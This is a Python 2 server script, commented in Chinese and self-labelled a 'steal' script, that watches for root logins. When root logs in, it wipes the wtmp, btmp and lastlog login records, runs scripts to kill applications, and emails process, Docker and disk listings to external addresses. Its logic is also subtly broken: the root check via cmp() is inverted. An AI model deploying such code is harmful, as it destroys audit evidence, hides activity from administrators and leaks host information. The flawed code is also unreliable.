#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import time
import socket
import sched
import subprocess
import smtplib
import uuid
from email.mime.text import MIMEText
from email.header import Header
import traceback

# 常量
r = 'root'

# 监听时间间隔（秒）
t = 30

# root账号上次登录状态
root_last_login_status = False

# 清理日志
clear_log_command = ['echo > /var/log/wtmp', 'echo > /var/log/btmp', 'echo > /var/log/lastlog']

# 执行脚本目录
script_dir = '/usr/software/script'

# email
email_host = 'email.server.com'
email_port = 465
sender = 'sender@email.com'
# 这里是授权码
sender_pwd = '***'
reciver_list = ['reciver1@email.com', 'reciver2@email.com']

root_logout_content = '检测到ROOT账号已登出\n'

# 创建周期对象
schedule = sched.scheduler(time.time, time.sleep)

def do_process():
    global root_last_login_status

    print '\n'
    print(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()), 'start process-------------->')

    # 获取who命令所有已登录的用户
    login_log = subprocess.check_output('who')
    
    print 'who:'
    print login_log 

    # 判断是否有账号登录
    if len(login_log) == 0:
        print 'no account login...'
        return

    # root当前登录状态
    root_login = False
    message_subject = ''

    for line in login_log.splitlines(False):
        words = line.split('[ ]+')
        uname = words[0]
        root_login = cmp(uname, r)
        if root_login:
            message_subject = 'Current Online User:\n' + login_log + '\n'
            break

    # 如果root没有登录
    if not root_login:
        # 上次root账号已登录
        if root_last_login_status:
            # root上次登录状态置为False
            root_last_login_status = False
            # 进行通知
            try:
                send_email(sender, reciver_list, get_ip_title(root_login), root_logout_content + get_server_info(), email_host, email_port, sender_pwd)
            except Exception as e:
                print 'send email happened exception!'
                print(set_chinese(traceback.format_exc()))
                return

        print 'no root login...'
        return
    else:
        # 当上次登录状态为已登录，本次登录状态为已登录时，就不处理了（意味着上次已经处理过了）
        if root_last_login_status:
            return

    # 如果存在root账号登录，则开始处理日志及应用，并发送邮件
    root_last_login_status = True

    # 1. 清除账号登录日志
    for command in clear_log_command:
        try:
            subprocess.call(command, shell=True)
        except Exception as e:
            print 'process clear login log happened exception!'
            print(set_chinese(traceback.format_exc()))
            return

    # 2. 执行某目录下的shell脚本，kill掉应用程序
    for file_name in os.listdir(script_dir):
        try:
            subprocess.call('sh ' + file_name, shell=True)
        except Exception as e:
            print 'process close application script happened exception!'
            print(set_chinese(traceback.format_exc()))
            return

    # 3. 发送邮件通知相关人员
    try:
        send_email(sender, reciver_list, get_ip_title(root_login), message_subject + get_server_info(), email_host, email_port, sender_pwd)
    except Exception as e:
        print 'send email happened exception!'
        print(set_chinese(traceback.format_exc()))
        return

    print('process completed-------------->', time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
    print '\n'


def send_email(from_sender, to_reciver_list, subject, content, host, port, from_sender_pwd):
    """发送邮件"""
    # 组装消息
    message = MIMEText(_text=content, _subtype='plain', _charset='utf-8')
    message['From'] = Header('服务器steal脚本<' + from_sender + '>', 'utf-8')
    message['To'] =  Header(';'.join(to_reciver_list), 'utf-8')
    message['Subject'] = Header(subject, 'utf-8')
    # stmp发送对象
    stmpObj = smtplib.SMTP_SSL()
    stmpObj.connect(host, port)
    #stmpObj.set_debuglevel(1) #调试模式
    stmpObj.login(from_sender, from_sender_pwd)
    stmpObj.sendmail(from_sender, to_reciver_list, message.as_string())
    stmpObj.close()


def set_chinese(info):
    u = info.decode('unicode-escape')
    r = u.encode('utf-8')
    return r


def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()

    return ip


def get_mac_address():
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])


def get_ip_title(root_login_status=True):
    if root_login_status:
        d = '录'
    else:
        d = '出'

    return '服务器[' + get_mac_address() + '@' + get_host_ip() + ']ROOT账号登' + d


def get_server_info():
    # 获取进程信息
    ps_info = do_shell(["ps", "-aux"])
    # 获取docker信息
    docker_info = do_shell(["docker", "ps", "-a"])
    # 获取硬盘信息
    df_info = do_shell(["df", "-h"])

    return "\n[steal@python.main]ps -aux\n" + ps_info + "\n[steal@python.main]docker ps -a\n" + docker_info + "\n[steal@python.main]df -h\n" + df_info


def do_shell(commands, code='unicode-escape'):
    command_result = subprocess.Popen(commands, stdout=subprocess.PIPE)
    out, err = command_result.communicate()
    return out.decode(code)



def init_evn():
    """初始化环境"""

    # 创建脚本文件夹
    subprocess.call('mkdir -p ' + script_dir, shell=True)


def build_enter(inc):
    """加入调度事件"""
    schedule.enter(0, 0, process_wrapper, (inc,))
    schedule.run()


def process_wrapper(inc):
    """包装执行函数"""
    do_process()
    schedule.enter(inc, 0, process_wrapper, (inc,))


if __name__ == "__main__":
    # 初始化
    init_evn()
    # 周期执行
    build_enter(t)
